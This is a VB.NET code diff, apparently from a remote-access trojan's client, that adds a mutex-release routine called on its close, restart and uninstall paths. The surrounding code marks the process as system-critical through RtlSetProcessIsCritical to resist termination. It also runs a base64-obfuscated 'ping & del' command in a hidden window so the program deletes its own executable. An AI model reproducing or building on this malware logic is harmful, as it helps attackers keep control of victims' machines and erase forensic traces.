@@ -21,11 +21,13 @@
                 Select Case A(1)
                     Case "1" 'close
                         CriticalProcesses_Disable()
+                        MT()
                         Environment.Exit(0)
 
                     Case "2" 'restart
                         CriticalProcesses_Disable()
                         Diagnostics.Process.Start(FP)
+                        MT()
                         Environment.Exit(0)
 
                     Case "3" 'uni
@@ -65,6 +67,8 @@
             CriticalProcesses_Disable()
             Threading.Thread.Sleep(100)
 
+            MT()
+
             'cmd.exe /c ping 0 -n 2 & del 
             Shell(BS(Convert.FromBase64String("Y21kLmV4ZSAvYyBwaW5nIDAgLW4gMiAmIGRlbCA=")) & """" & FullPath & """", AppWinStyle.Hide, False, -1) 'Delete NEXE
             Environment.Exit(0)
@@ -72,6 +76,14 @@
 
     End Sub
 
+    Public Shared Sub MT()
+        Dim createdNew As Boolean = False
+        Dim MTX As Threading.Mutex = New Threading.Mutex(True, HWID, createdNew)
+        If MTX IsNot Nothing Then
+            MTX.Close()
+            MTX = Nothing
+        End If
+    End Sub
 
     'https://www.codeproject.com/Articles/43405/Protecting-Your-Process-with-RtlSetProcessIsCriti
     <Runtime.InteropServices.DllImport("NTdll.dll", EntryPoint:="RtlSetProcessIsCritical", SetLastError:=True)>
